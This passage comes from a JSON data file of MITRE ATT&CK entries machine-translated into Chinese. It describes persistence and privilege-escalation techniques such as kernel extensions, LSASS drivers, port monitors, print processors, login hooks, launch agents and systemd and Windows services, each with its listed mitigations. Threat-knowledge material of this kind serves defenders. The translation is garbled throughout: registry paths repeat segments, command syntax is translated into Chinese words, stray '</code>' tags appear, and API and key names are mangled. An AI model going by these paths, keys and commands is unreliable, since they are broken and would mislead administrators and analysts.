          "content": "命令加载和卸载Kexts。Kexts需要与Apple允许其签署内核扩展名一起授予特权的开发人员ID签名。没有这些特权的开发人员仍然可以签署Kext，但是除非禁用SIP，否则它们不会加载。如果启用了SIP，则在添加到AUXKC之前验证KEXT签名。"
        }
      ],
      [
        {
          "type": "text",
          "content": "自MacOS Catalina 10.15以来，内核扩展已被贬低，而有利于系统扩展。但是，由于内核编程接口没有系统扩展，因此仍然允许KEXT作为“传统系统扩展”。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用LKM和KEXT在系统上进行持久性和/或特权升级。在野外发现了例子，并且还有一些相关的开源项目。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "检测Linux rootkit的常见工具包括：rkhunter，Chrootkit，尽管可以设计rootkits来逃避某些检测工具。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "应用程序控制和软件限制工具，例如SELINUX，KSPP，GRSECURITY MODHARDEN和LINUX内核调整可以帮助限制内核模块加载。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对根帐户的访问，并防止用户通过适当的特权分离和限制特权升级机会加载内核模块和扩展。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "使用MDM禁用用户安装或批准内核扩展的能力，并确保所有批准的内核扩展名与"
            },
            {
              "type": "code",
              "content": " com.apple.syspolicy.kernel-extension-extension-policy-Policy-Policy-Policy "
            },
            {
              "type": "text",
              "content": "中指定的策略保持一致。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.007",
    "name": "Re-opened Applications",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会修改PLIST文件以自动运行应用程序时，当用户登录时。当用户通过MacOS图形用户界面（GUI）重新登录或重新启动时，向用户提供了一个提示，并使用复选框为“重新打开Windows重新打开窗口”。在”。选择后，当前打开的所有应用程序都将添加到名为"
        },
        {
          "type": "code",
          "content": " com.apple.loginwindow的属性列表文件中。[uuid] .plist "
        },
        {
          "type": "text",
          "content": " </code> </code> </code>〜/library/preferences/preferences/byhost </byhost </code>目录。此文件中列出的应用程序会自动重新打开用户的下一个登录。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过在"
        },
        {
          "type": "code",
          "content": " com.apple.loginwindow中添加恶意应用程序路径来建立持久性。[uuid] .plist "
        },
        {
          "type": "text",
          "content": "文件在用户登录时执行有效载荷。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "可以使用以下终端命令完全禁用此功能："
            },
            {
              "type": "code",
              "content": "默认值WRITE -G ApplePersistence -Bool no "
            },
            {
              "type": "text",
              "content": "。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "在日志记录时持有移位键可以防止应用自动打开。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.008",
    "name": "LSASS Driver",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会修改或添加LSAS驱动程序以获得受损系统的持久性。Windows安全子系统是一组组件，可管理和执行计算机或域的安全策略。本地安全局（LSA）是负责本地安全策略和用户身份验证的主要组件。LSA包括与其他各种安全功能关联的多个动态链接库（DLL），所有这些功能都在LSA子系统服务（LSASS）LSASS.EXE PROCESS的上下文中运行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以针对LSAS驱动程序以获得持久性。通过更换或添加非法驱动程序（例如，劫持执行流），对手可以使用LSA操作来连续执行恶意有效载荷。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1043",
        "name": "凭证访问保护",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10和Server 2016上，启用Windows Defender Guard可以在没有任何设备驱动程序的情况下在孤立的虚拟化环境中运行LSASS.EXE。"
            }
          ]
        ]
      },
      {
        "id": "M1025",
        "name": "特权过程完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 8.1和Server 2012 R2上，通过设置注册表密钥"
            },
            {
              "type": "code",
              "content": " HKEY_LOCAL_MACHINE \\ SYSTEM \\ CurrentControlset \\ control \\ lsa \\ lsa \\ runasppl "
            },
            {
              "type": "text",
              "content": " "
            },
            {
              "type": "code",
              "content": " dword：00000001 "
            },
            {
              "type": "text",
              "content": "。LSA保护可确保只有在通过Microsoft签名签名并遵守Microsoft Security Security Development Lifececle（SDL）流程指导时，才能加载LSA插件和驱动程序。"
            }
          ]
        ]
      },
      {
        "id": "M1044",
        "name": "限制库加载",
        "description": [
          [
            {
              "type": "text",
              "content": "确保启用安全dll搜索模式"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ system \\ currentControlset \\ control \\ control \\ session manager \\ safedllsearchmode "
            },
            {
              "type": "text",
              "content": "降低lsass.exe加载恶意代码库的风险。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.009",
    "name": "Shortcut Modification",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以创建或修改可以在系统引导或用户登录过程中执行程序的快捷方式。快捷方式或符号链接用于引用当系统启动过程单击或执行快捷方式时将打开或执行的其他文件或程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用启动文件夹中的快捷方式，以执行其工具并实现持久性。尽管经常在感染链中用作有效载荷（例如，矛盾的依恋），但对手也可能会创建新的快捷方式作为间接手段，同时还滥用伪装以使恶意快捷方式出现为合法计划。对手还可以编辑目标路径或完全替换现有的快捷方式，以便执行其恶意软件，而不是预期的合法程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "快捷方式也可以通过实施其他方法来滥用以确立持久性。例如，可以修改LNK浏览器扩展（例如浏览器扩展程序）以持续启动恶意软件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制谁可以在Windows中创建符号链接到适当的组（例如管理员）和虚拟化的必要组的权限。这可以通过GPO：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户权利分配：创建符号链接。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.010",
    "name": "Port Monitors",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用端口监视器在系统启动期间运行dll提供的dll，以持续或特权升级。可以通过"
        },
        {
          "type": "code",
          "content": " addMonitor "
        },
        {
          "type": "text",
          "content": " API调用设置端口监视器，以设置在启动时加载的DLL。该DLL可以位于"
        },
        {
          "type": "code",
          "content": " c：\\ Windows \\ System32 "
        },
        {
          "type": "text",
          "content": "中，并将由PRINT SPOOLER SERVICE（SPOOLSV.EXE）加载。spoolsv.exe过程也在系统级别的权限下运行。另外，如果权限允许将DLL的完全归结路径名编写为"
        },
        {
          "type": "code",
          "content": " hklm \\ System \\ currentControlset \\ Control \\ control \\ print \\ print \\ monitors "
        },
        {
          "type": "text",
          "content": "，则可以加载任意DLL。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注册表密钥包含以下条目："
        }
      ],
      [
        {
          "type": "list",
          "content": "本地端口"
        },
        {
          "type": "list",
          "content": "标准TCP/IP端口"
        },
        {
          "type": "list",
          "content": "USB监视器"
        },
        {
          "type": "list",
          "content": "WSD端口"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用此技术在启动时加载恶意代码，这将持续在系统重启并执行系统上。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1547.012",
    "name": "Print Processors",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用印刷处理器在系统启动期间以持久性和/或特权升级而运行恶意DLL。打印处理器是启动过程中"
        },
        {
          "type": "code",
          "content": " spoolsv.exe "
        },
        {
          "type": "text",
          "content": "加载的DLL。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会通过在启动时添加加载恶意DLL的打印处理器来滥用印刷吊杆服务。可以通过"
        },
        {
          "type": "code",
          "content": " addPrintProcessor "
        },
        {
          "type": "text",
          "content": " api调用具有"
        },
        {
          "type": "code",
          "content": " seloAddriverPrivilege "
        },
        {
          "type": "text",
          "content": "启用的帐户的API调用。另外，可以通过添加"
        },
        {
          "type": "code",
          "content": " hklm \\ System \\ [CurrentControlset或ControlSet001] \\ Control \\ print \\ Environments \\ [Windows X64] \\ Print Proceserors \\ [USER \\ [USER \\ [USER \\ [USER \\ [USER \\ [USER \\ [user定义的] \\驱动程序"
        },
        {
          "type": "text",
          "content": "指向DLL的注册表密钥。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了使恶意打印处理器正确安装，有效载荷必须位于专用系统打印处理器目录中，可以使用"
        },
        {
          "type": "code",
          "content": " getPrintProcessordirectory "
        },
        {
          "type": "text",
          "content": " api呼叫找到，或通过此目录的相对路径引用。安装打印处理器后，必须重新启动的Print Spooler服务以使其运行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "印刷剥离器服务在系统级别的权限下运行，因此，由对手安装的打印处理器可以在特权升高的情况下运行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制可以通过禁用"
            },
            {
              "type": "code",
              "content": " seloaddriverPrivilege "
            },
            {
              "type": "text",
              "content": "来加载或卸载设备驱动程序的用户帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.013",
    "name": "XDG Autostart Entries",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "当用户的桌面环境加载时，对手可以添加或修改XDG AutoStart条目以执行恶意程序或命令。XDG AutoStart条目可用于任何符合XDG的Linux系统。XDG AutoStart条目使用桌面条目文件（"
        },
        {
          "type": "code",
          "content": " .desktop "
        },
        {
          "type": "text",
          "content": "）在用户登录时配置用户的桌面环境。这些配置文件确定用户登录时启动哪些应用程序，将关联的应用程序定义为打开特定的文件类型，并定义用于打开可移动媒体的应用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用此功能来建立持久性，通过在"
        },
        {
          "type": "code",
          "content": " exec "
        },
        {
          "type": "text",
          "content": " .desktop </code>配置文件中添加恶意二进制或命令的路径。当用户登录处加载用户的桌面环境时，"
        },
        {
          "type": "code",
          "content": " .desktop "
        },
        {
          "type": "text",
          "content": "位于XDG AutoStart目录中的文件将自动执行。系统范围的AutoStart条目位于"
        },
        {
          "type": "code",
          "content": "/etc/xdg/autostart "
        },
        {
          "type": "text",
          "content": "目录中，当时用户条目位于"
        },
        {
          "type": "code",
          "content": "〜/.config/autostart </autostart "
        },
        {
          "type": "text",
          "content": " Directory中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会将这一技术与伪装结合，以将恶意的AutoStart条目与合法的计划相结合。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1033",
        "name": "限制软件安装",
        "description": [
          [
            {
              "type": "text",
              "content": "仅将软件安装限制在受信任的存储库中，并谨慎对待孤儿软件包。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对XDG AutoStart条目的写入访问权限，以仅选择特权用户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权，因此只有授权的特权用户才能创建和修改XDG AutoStart条目。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.014",
    "name": "Active Setup",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过在本地机器的活动设置中添加注册表密钥来实现持久性。Active Setup是一种Windows机制，用户登录时用于执行程序。注册表密钥中存储的值将在用户登录到计算机后执行。这些程序将在用户的上下文下执行，并将具有该帐户相关的权限级别。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会通过在"
        },
        {
          "type": "code",
          "content": " HKLM \\ Software \\ Microsoft \\ Active Setup \\ Aptive Setup \\安装组件\\ "
        },
        {
          "type": "text",
          "content": "下创建一个密钥来滥用活动设置，并为"
        },
        {
          "type": "code",
          "content": " stubpath "
        },
        {
          "type": "text",
          "content": "设置恶意值。此值将作为用户登录到计算机时将执行的程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以滥用这些组件来执行恶意软件，例如远程访问工具，以通过系统重新启动保持持久性。对手也可以使用伪装来使注册表的条目看起来好像与合法计划相关联。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1547.015",
    "name": "Login Items",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会在用户登录时添加登录项目以执行以获得持久性或升级特权。登录项目是当用户登录时自动启动的应用程序，文档，文件夹或服务器连接。可以通过共享文件列表或服务管理框架添加登录项目。共享文件列表登录项目可以使用脚本语言（例如AppleScript）设置，而服务管理框架使用API调用"
        },
        {
          "type": "code",
          "content": " smloginiTemSetEnabled "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用服务管理框架杠杆安装的登录项目"
        },
        {
          "type": "code",
          "content": "启动"
        },
        {
          "type": "text",
          "content": "在系统偏好中不可见，只能由创建它们的应用程序删除。使用共享文件列表创建的登录项目在系统首选项中可见，可以在启动时隐藏应用程序，并通过启动服务（而不是启动）执行，以打开应用程序，文档或URL，而无需使用Finder。用户和应用程序使用登录项目来配置其用户环境以启动常用的服务或应用程序，例如电子邮件，聊天和音乐应用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以利用AppleScript和本机API调用来创建登录项目来产生恶意可执行文件。在MACOS上的版本10.5之前，对手可以通过使用AppleScript将Apple Events发送到“系统事件”过程中添加登录项目，该过程具有用于操纵登录项目的AppleScript词典。对手可以使用"
        },
        {
          "type": "code",
          "content": "告诉应用程序“系统事件”之类的命令，以属性/路径/to/operable "
        },
        {
          "type": "text",
          "content": "在最终登录项目。此命令将恶意执行的路径添加到位于"
        },
        {
          "type": "code",
          "content": "〜/Library/Application Support/com.apple.backgroundTaskManagementagentAgent/coundmentItems.btm "
        },
        {
          "type": "text",
          "content": "的登录项目文件列表中。对手还可以使用登录项目来启动可执行文件，这些项目可用于远程控制受害者系统，也可以通过提示用户凭据来控制特权升级。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1037.001",
    "name": "Logon Script (Windows)",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Initialization Scripts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用在登录初始化时自动执行的Windows登录脚本来建立持久性。Windows允许每当特定用户或一组用户登录到系统时运行登录脚本。这是通过将脚本的路径添加到"
        },
        {
          "type": "code",
          "content": " hkcu \\ Environment \\ userInitMprLogonScript "
        },
        {
          "type": "text",
          "content": "注册表密钥来完成的。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这些脚本来保持对单个系统的持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员帐户。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保为注册表设置适当的权限，以防止用户修改可能导致持久性的登录脚本的密钥。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1037.002",
    "name": "Login Hook",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Initialization Scripts",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用登录钩在用户登录上建立持久性。登录钩是一个PLIST文件，指向特定脚本以在用户登录时使用根特权执行的特定脚本。PLIST文件位于"
        },
        {
          "type": "code",
          "content": "/library/preferences/com.apple.loginwindow.plist "
        },
        {
          "type": "text",
          "content": "文件中，可以使用"
        },
        {
          "type": "code",
          "content": " defaults "
        },
        {
          "type": "text",
          "content": " command> command> commandline实用程序进行修改。对于注销挂钩，此行为是相同的，在该挂钩上可以在用户注销时执行脚本。所有挂钩都需要管理员权限修改或创建钩子。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用"
        },
        {
          "type": "code",
          "content": " loginhook "
        },
        {
          "type": "text",
          "content": " </code> logouthook </code> logouthook </code> key-键 - 价值对。恶意脚本将在下一个用户登录时执行。如果已经存在登录钩，则对手可以将其他命令添加到现有的登录钩中。一次在系统上只能有一个登录和注销挂钩。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注意：在10.11版的MacOS中对登录钩进行了弃用，以支持发射守护程序和发射代理"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "将对登录脚本的访问限制为特定的管理员。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1037.003",
    "name": "Network Logon Script",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Initialization Scripts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用在登录初始化时自动执行的网络登录脚本来建立持久性。可以使用Active Directory或组策略对象分配网络登录脚本。这些登录脚本以分配给用户的特权运行。根据网络中的系统，初始化这些脚本之一可以应用于多个或可能的所有系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这些脚本来保持网络上的持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员帐户。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "将对登录脚本的访问限制为特定的管理员。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1037.004",
    "name": "RC Scripts",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Initialization Scripts",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过修改RC脚本来建立持久性，而RC脚本在Unix式系统的启动过程中执行。这些文件允许系统管理员以不同的运行级别映射和启动自定义服务。RC脚本需要ROOT特权才能修改。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过在"
        },
        {
          "type": "code",
          "content": " rc.local "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " rc.common "
        },
        {
          "type": "text",
          "content": "以及其他针对Unix-like分布的RC脚本中添加恶意二进制路径或shell命令来建立持久性。重新启动后，系统将脚本内容执行为根，从而导致持久性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对RC脚本的对手滥用对使用root用户（例如IoT或嵌入式系统）的轻质Unix样发行版特别有效。"
        }
      ],
      [
        {
          "type": "text",
          "content": "几个类似Unix的系统已移至SystemD并弃用了RC脚本的使用。现在，这是MACOS中的一种弃用机制，支持LaunchD。该技术可以在Mac OS X Panther V10.3和早期版本上使用，该版本仍执行RC脚本。为了保持向后兼容性，某些系统（例如Ubuntu）将执行RC脚本，如果它们具有正确的文件权限。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权，因此只有授权用户才能编辑rc.common文件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1037.005",
    "name": "Startup Items",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Initialization Scripts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用在启动初始化时自动执行的启动项目来建立持久性。启动项目在启动过程的最后阶段执行，并包含Shell脚本或其他可执行文件以及系统使用的配置信息，以确定所有启动项目的执行顺序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "从技术上讲，这是一种弃用的技术（被启动守护程序取代），因此，默认情况下，适当的文件夹"
        },
        {
          "type": "code",
          "content": "/library/startupitems "
        },
        {
          "type": "text",
          "content": "不保证在系统上存在，但默认情况下确实存在Macos Sierra。启动项目是一个目录，其可执行文件和配置属性列表（PLIST），"
        },
        {
          "type": "code",
          "content": " startupparameters.plist "
        },
        {
          "type": "text",
          "content": "，位于顶级目录中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在启动Utems目录中创建适当的文件夹/文件以注册自己的持久性机制。此外，由于启动项目在MACOS的启动阶段运行，因此它们将作为升高的根用户运行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "由于不推荐使用startupitems，因此阻止所有用户写入"
            },
            {
              "type": "code",
              "content": "/library/startupitems "
            },
            {
              "type": "text",
              "content": "目录将阻止任何启动项目被注册。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1543.001",
    "name": "Launch Agent",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Create or Modify System Process",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会创建或修改发射代理，以反复执行恶意有效载荷，这是持久性的一部分。当用户登录时，启动了每个用户启动过程，该进程从属性列表（.plist）文件中加载每个启动按需用户代理的参数>，"
        },
        {
          "type": "code",
          "content": "/library/启动代码"
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "〜/library/launchagents "
        },
        {
          "type": "text",
          "content": "。属性列表文件使用"
        },
        {
          "type": "code",
          "content": " Label "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " programArguments "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " runatload "
        },
        {
          "type": "text",
          "content": "键来识别启动代理的名称，可执行文件位置和执行时间。通常安装启动代理以执行对程序的更新，在登录处启动用户指定的程序或执行其他开发人员任务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "发射代理也可以使用launchctl命令执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以安装新的启动代理，该代理通过将.plist文件放入使用"
        },
        {
          "type": "code",
          "content": " runatload "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " keepalive "
        },
        {
          "type": "text",
          "content": "键设置为"
        },
        {
          "type": "code",
          "content": " true </code的"
        },
        {
          "type": "text",
          "content": " keepalive </code> keepalive </code> keepalive </code>键来执行登录。>。可以使用相关操作系统或良性软件的名称掩饰启动代理名称。启动代理具有用户级特权创建，并具有用户级别权限执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "将组策略设置为将文件权限限制为"
            },
            {
              "type": "code",
              "content": "〜/启动器"
            },
            {
              "type": "text",
              "content": "文件夹。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1543.002",
    "name": "Systemd Service",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Create or Modify System Process",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以创建或修改SystemD服务，以反复执行恶意有效载荷，这是持久性的一部分。SystemD是一种系统和服务经理，通常用于管理背景守护程序过程（也称为服务）和其他系统资源。SystemD是许多Linux分布上的默认初始化（INIT）系统，取代了旧版INIT系统，包括Sysvinit和Upstart，同时使后退兼容。"
        }
      ],
      [
        {
          "type": "text",
          "content": "SystemD使用"
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "文件扩展名）使用单元配置文件来编码有关服务过程的信息。默认情况下，系统级单元文件存储在根拥有目录的"
        },
        {
          "type": "code",
          "content": "/Systemd/System "
        },
        {
          "type": "text",
          "content": "目录中（"
        },
        {
          "type": "code",
          "content": "/"
        },
        {
          "type": "text",
          "content": "）。用户级单元文件存储在用户拥有目录的"
        },
        {
          "type": "code",
          "content": "/Systemd/user "
        },
        {
          "type": "text",
          "content": "目录中（"
        },
        {
          "type": "code",
          "content": " $ $ home "
        },
        {
          "type": "text",
          "content": "）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在"
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "单元文件中，以下指令用于执行命令："
        }
      ],
      [
        {
          "type": "list",
          "content": "ExecStart，Execstartpre和ExecstartPost指令在通过SystemCtl手动启动服务或系统启动时执行，如果设置了服务自动启动。"
        },
        {
          "type": "list",
          "content": "当服务重新启动时，ExecReload指令执行。"
        },
        {
          "type": "list",
          "content": "停止服务时，ExecStop，ExecStoppre和ExecStopost Dicctions执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手已经创建了新的服务文件，更改了命令a "
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "文件的指令执行，并修改了用户指令a "
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "文件>文件执行为AS，这可能会导致特权升级。对手也可以在这些目录中放置符号链接，从而使SystemD能够找到这些有效载荷，而不管它们驻留在文件系统上。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1033",
        "name": "限制软件安装",
        "description": [
          [
            {
              "type": "text",
              "content": "仅将软件安装限制在受信任的存储库中，并谨慎对待孤儿软件包。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "SystemD Service单元文件的创建和修改通常保留给管理员，例如Linux root用户和其他具有Superuser特权的用户。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对SystemD单元文件的读/写入访问仅选择具有合法需要管理系统服务的特权用户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将用户对系统实用程序（例如"
            },
            {
              "type": "code",
              "content": " systemctl "
            },
            {
              "type": "text",
              "content": "）的访问仅限于有合法需求的用户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1543.003",
    "name": "Windows Service",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Create or Modify System Process",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以创建或修改Windows服务，以反复执行恶意有效载荷，这是持久性的一部分。当Windows启动时，它会启动程序或称为执行背景系统功能的服务的应用程序。Windows注册表中存储了Windows Service Service配置信息，包括服务可执行文件或恢复程序/命令的文件路径。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以安装新服务或修改现有服务以在启动时执行以持续到系统上。可以使用系统实用程序（例如SC.EXE），直接修改注册表或直接与Windows API进行交互来设置或修改服务配置。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以使用服务来安装和执行恶意驱动程序。例如，将驱动程序文件（ex："
        },
        {
          "type": "code",
          "content": " .sys "
        },
        {
          "type": "text",
          "content": "）删除后，可以通过本机API函数（例如"
        },
        {
          "type": "code",
          "content": " createServicew（）"
        },
        {
          "type": "text",
          "content": "（或手动手动）加载和注册。通过诸如"
        },
        {
          "type": "code",
